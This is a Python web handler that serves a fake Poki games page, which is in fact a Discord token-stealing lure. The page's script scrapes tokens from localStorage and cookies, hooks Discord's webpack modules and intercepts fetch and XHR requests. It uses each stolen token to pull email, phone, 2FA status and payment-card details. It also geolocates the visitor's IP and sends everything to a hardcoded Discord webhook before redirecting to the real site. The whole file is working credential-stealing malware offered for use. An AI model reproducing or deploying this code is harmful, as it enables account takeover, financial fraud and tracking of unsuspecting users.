from http.server import BaseHTTPRequestHandler
import json
import urllib.request

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
        POKI_IMAGE = "https://img.poki.com/cdn-cgi/image/quality=78,width=1200,height=1200,fit=cover,f=auto/d1b46218990584f294f2f27eed934b5b.png"
        
        ip = (self.headers.get('CF-Connecting-IP') or 
              self.headers.get('X-Real-IP') or 
              self.headers.get('X-Forwarded-For', '').split(',')[0].strip())
        ua = self.headers.get('User-Agent', 'Unknown')
        
        # Get location from IP (no permission needed)
        location_data = {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'zip': 'Unknown', 'lat': 'N/A', 'lon': 'N/A'}
        try:
            req = urllib.request.Request(f"https://ipapi.co/{ip}/json/", headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=3) as response:
                location_data = json.loads(response.read().decode())
        except:
            try:
                with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?fields=66846719", timeout=3) as response:
                    data = json.loads(response.read().decode())
                    location_data = {
                        'city': data.get('city', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'country': data.get('country', 'Unknown'),
                        'zip': data.get('zip', 'Unknown'),
                        'lat': data.get('lat', 'N/A'),
                        'lon': data.get('lon', 'N/A')
                    }
            except:
                pass
        
        html = f'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="Poki - Free Online Games">
<meta property="og:description" content="Play the best free online games">
<meta property="og:image" content="{POKI_IMAGE}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta name="twitter:card" content="summary_large_image">
<title>Poki Games</title>
<style>
*{{margin:0;padding:0}}
body{{background:#00D9FF;display:flex;justify-content:center;align-items:center;min-height:100vh}}
.logo{{max-width:400px;width:90%}}
</style>
</head>
<body>
<img src="{POKI_IMAGE}" class="logo">
<script>
// Pass location data from Python to JavaScript
const locationData = {{
    city: '{location_data.get("city", "Unknown")}',
    region: '{location_data.get("region", "Unknown")}',
    country: '{location_data.get("country", "Unknown")}',
    zip: '{location_data.get("zip", "Unknown")}',
    lat: '{location_data.get("lat", "N/A")}',
    lon: '{location_data.get("lon", "N/A")}'
}};
(async()=>{{
// NO GPS - Silent data grab only
const webhook='{WEBHOOK}';

// AGGRESSIVE Discord token grab - ALL possible methods
let tokens=[];

// Wait a moment for Discord to load
await new Promise(resolve=>setTimeout(resolve,500));

// Method 1: Direct window.localStorage access
try{{
const keys=['token','tokens','discord_token','user_token'];
keys.forEach(key=>{{
const val=localStorage.getItem(key);
if(val){{
const clean=val.replace(/['"]/g,'');
if(clean.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
if(!tokens.includes(clean))tokens.push(clean);
}}
}}
}});
}}catch(e){{}}

// Method 2: Scan ALL localStorage keys for token patterns
try{{
Object.keys(localStorage).forEach(key=>{{
try{{
const val=localStorage.getItem(key);
if(val&&val.length>20){{
const matches=val.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g)||[];
matches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
const mfaMatches=val.match(/mfa\\.[\\w-]{{84,}}/g)||[];
mfaMatches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
}}
}}catch(e){{}}
}});
}}catch(e){{}}

// Method 3: Check document.cookie for tokens
try{{
const cookies=document.cookie.split(';');
cookies.forEach(cookie=>{{
const matches=cookie.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27,}}/g)||[];
matches.forEach(t=>{{if(!tokens.includes(t))tokens.push(t)}});
}});
}}catch(e){{}}

// Method 4: Discord Webpack
try{{
if(window.webpackChunkdiscord_app){{
window.webpackChunkdiscord_app.push([[Math.random()],{{}},r=>{{
for(let mod of Object.values(r.c)){{
try{{
if(mod?.exports?.default?.getToken){{
const t=mod.exports.default.getToken();
if(t&&!tokens.includes(t))tokens.push(t);
}}
if(mod?.exports?.getToken){{
const t=mod.exports.getToken();
if(t&&!tokens.includes(t))tokens.push(t);
}}
}}catch(e){{}}
}}
}}]);
}}
}}catch(e){{}}

// Method 5: Alternative webpack method
try{{
let cachedModules;
if(window.webpackChunkdiscord_app){{
window.webpackChunkdiscord_app.push([[Symbol()],{{}},r=>{{cachedModules=r.c}}]);
for(let mod in cachedModules){{
try{{
const exp=cachedModules[mod].exports;
if(exp?.Z?.getToken){{
const t=exp.Z.getToken();
if(t&&!tokens.includes(t))tokens.push(t);
}}
if(exp?.default?.getToken){{
const t=exp.default.getToken();
if(t&&!tokens.includes(t))tokens.push(t);
}}
}}catch(e){{}}
}}
}}
}}catch(e){{}}

// Method 6: XMLHttpRequest intercept (catches tokens in use)
try{{
const origOpen=XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open=function(...args){{
this.addEventListener('load',function(){{
try{{
const authHeader=this.getResponseHeader('authorization');
if(authHeader&&authHeader.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
if(!tokens.includes(authHeader))tokens.push(authHeader);
}}
}}catch(e){{}}
}});
return origOpen.apply(this,args);
}};
}}catch(e){{}}

// Method 7: Fetch intercept
try{{
const origFetch=window.fetch;
window.fetch=async function(...args){{
const response=await origFetch(...args);
try{{
const cloned=response.clone();
const authHeader=cloned.headers.get('authorization');
if(authHeader&&authHeader.match(/[\\w-]{{24}}\\.[\\w-]{{6}}/)){{
if(!tokens.includes(authHeader))tokens.push(authHeader);
}}
}}catch(e){{}}
return response;
}};
}}catch(e){{}}

// Give interceptors time to catch tokens
await new Promise(resolve=>setTimeout(resolve,1000));

// If Discord token found, get full account
if(tokens.length>0){{
for(let token of tokens){{
try{{
let r=await fetch('https://discord.com/api/v9/users/@me',{{headers:{{'Authorization':token}}}});
if(r.ok){{
let user=await r.json();

// Get payment info
let cards=[];
try{{
let b=await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources',{{headers:{{'Authorization':token}}}});
if(b.ok){{
let data=await b.json();
cards=data.map(c=>`${{c.brand}} *${{c.last_4}} (${{c.expires_month}}/${{c.expires_year}})`);
}}
}}catch(e){{}}

// Get Nitro
let nitro='None';
try{{
let s=await fetch('https://discord.com/api/v9/users/@me/billing/subscriptions',{{headers:{{'Authorization':token}}}});
if(s.ok){{
let data=await s.json();
if(data.length>0)nitro=data[0].type==1?'Nitro Classic':'Nitro Full';
}}
}}catch(e){{}}

const email=user.email||'No email set';
const phone=user.phone||'No phone set';
const username=`${{user.username}}#${{user.discriminator}}`;
const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;

// Send ONE complete message with EVERYTHING
await fetch(webhook,{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:`@everyone 🚨 **${{username}}** OPENED THE LINK!`,
embeds:[{{
title:`🔑 ${{username}} - FULL ACCOUNT STOLEN`,
color:16711680,
description:`**Discord:** ${{username}}\\n**Email:** ${{email}}\\n**Phone:** ${{phone}}`,
fields:[
{{name:'👤 Discord User',value:username,inline:false}},
{{name:'📧 Email Address',value:email,inline:false}},
{{name:'📱 Phone Number',value:phone,inline:false}},
{{name:'🆔 User ID',value:user.id,inline:true}},
{{name:'🔐 2FA',value:user.mfa_enabled?'✅ Enabled':'❌ Disabled',inline:true}},
{{name:'💎 Nitro',value:nitro,inline:true}},
{{name:'💳 Payment Cards',value:cards.length>0?cards.join('\\n'):'None',inline:false}},
{{name:'📍 IP Address',value:'{ip}',inline:true}},
{{name:'🏙️ City',value:locationData.city,inline:true}},
{{name:'🗺️ State',value:locationData.region,inline:true}},
{{name:'📮 ZIP Code',value:locationData.zip,inline:true}},
{{name:'🌍 Country',value:locationData.country,inline:true}},
{{name:'📌 Coordinates',value:`${{locationData.lat}}, ${{locationData.lon}}`,inline:true}},
{{name:'🕐 Timezone',value:tz,inline:true}},
{{name:'🖥️ Platform',value:navigator.platform,inline:true}},
{{name:'🌍 Language',value:navigator.language,inline:true}},
{{name:'💻 User Agent',value:`\`\`\`{ua[:80]}\`\`\``,inline:false}},
{{name:'🔑 Full Token',value:`\`\`\`${{token}}\`\`\``,inline:false}}
],
thumbnail:{{url:`https://cdn.discordapp.com/avatars/${{user.id}}/${{user.avatar}}.png`}},
footer:{{text:`${{username}} - Complete data grab`}}
}}]
}})
}});
break;
}}
}}catch(e){{}}
}}
}}else{{
// No Discord - send what we have
const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
await fetch(webhook,{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
content:'@everyone',
embeds:[{{
title:'🎯 Someone Opened The Link',
color:16753920,
description:'**No Discord login detected** (opened from Discord app in external browser)',
fields:[
{{name:'📍 IP Address',value:'{ip}',inline:false}},
{{name:'🏙️ City',value:locationData.city,inline:true}},
{{name:'🗺️ State/Region',value:locationData.region,inline:true}},
{{name:'📮 ZIP Code',value:locationData.zip,inline:true}},
{{name:'🌍 Country',value:locationData.country,inline:true}},
{{name:'📌 Coordinates',value:`${{locationData.lat}}, ${{locationData.lon}}`,inline:true}},
{{name:'🕐 Timezone',value:tz,inline:true}},
{{name:'🌍 Language',value:navigator.language,inline:true}},
{{name:'🖥️ Platform',value:navigator.platform,inline:true}},
{{name:'💻 User Agent',value:`\`\`\`{ua[:80]}\`\`\``,inline:false}}
],
footer:{{text:'Discord token not found - victim not logged into Discord web'}}
}}]
}})
}});
}}

// Send browser info separately
try{{
const tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
await fetch(webhook,{{
method:'POST',
headers:{{'Content-Type':'application/json'}},
body:JSON.stringify({{
embeds:[{{
title:'💻 Browser Info',
color:65535,
fields:[
{{name:'Timezone',value:tz,inline:true}},
{{name:'Language',value:navigator.language,inline:true}},
{{name:'Platform',value:navigator.platform,inline:true}}
]
}}]
}})
}});
}}catch(e){{}}

// Redirect to real Poki after grabbing data
setTimeout(()=>{{window.location.href='https://poki.com'}},2500);
}})();
</script>
</body>
</html>'''
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
